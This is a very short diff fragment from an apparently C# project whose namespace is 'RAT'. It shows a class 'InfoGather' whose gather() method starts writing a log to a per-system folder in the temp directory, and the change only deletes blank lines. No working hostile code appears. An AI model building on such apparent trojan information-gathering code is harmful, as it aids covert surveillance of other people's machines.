@@ -10,8 +10,6 @@ namespace RAT
 {
     class InfoGather
     {
-
-
          public static void gather()
         {
             using (StreamWriter w = File.AppendText(Path.GetTempPath() + Program.SystemID + @"\log"))
